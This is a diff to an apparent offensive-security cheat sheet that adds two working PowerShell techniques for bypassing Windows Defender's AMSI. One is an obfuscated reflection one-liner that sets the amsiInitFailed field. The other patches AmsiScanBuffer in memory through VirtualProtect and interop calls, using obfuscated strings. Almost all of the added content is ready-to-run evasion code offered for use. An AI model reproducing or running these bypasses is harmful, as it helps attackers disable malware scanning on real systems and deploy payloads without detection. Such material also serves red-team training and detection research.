@@ -2813,7 +2813,36 @@ Invoke-Command -Scriptblock{whoami;hostname} -computername dcorp-mgmt
 ```
 ##### POWERSHELL - BYPASS DEFENDER AMSI
 ```
-'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+```
+$gkfpf = @"
+using System;
+using System.Runtime.InteropServices;
+public class gkfpf {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr pciuzf, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $gkfpf
+
+$uutpccl = [gkfpf]::LoadLibrary("$(('ämsí.d'+'ll').normaLiZe([chAr]([bytE]0x46)+[Char]([Byte]0x6f)+[Char]([bYTe]0x72)+[cHar]([BYtE]0x6d)+[CHar](68)) -replace [cHar](92*35/35)+[cHaR](112*52/52)+[CHAr](123)+[cHAr](77*16/16)+[cHAR](110+55-55)+[CHar](8+117))")
+$bqysed = [gkfpf]::GetProcAddress($uutpccl, "$(('Ämsî'+'Scán'+'Buff'+'er').NORMaLIzE([cHAr](70)+[cHAr]([byTE]0x6f)+[CHar]([bYtE]0x72)+[CHAr]([BYtE]0x6d)+[CHar](16+52)) -replace [cHar](92)+[CHaR]([BYTE]0x70)+[char]([bYte]0x7b)+[ChaR]([bytE]0x4d)+[cHar]([bytE]0x6e)+[chAr]([bytE]0x7d))")
+$p = 0
+[gkfpf]::VirtualProtect($bqysed, [uint32]5, 0x40, [ref]$p)
+$mvgn = "0xB8"
+$fomg = "0x57"
+$oceq = "0x00"
+$pobg = "0x07"
+$cdoe = "0x80"
+$kdiv = "0xC3"
+$emair = [Byte[]] ($mvgn,$fomg,$oceq,$pobg,+$cdoe,+$kdiv)
+[System.Runtime.InteropServices.Marshal]::Copy($emair, 0, $bqysed, 6)
 ```
 
 
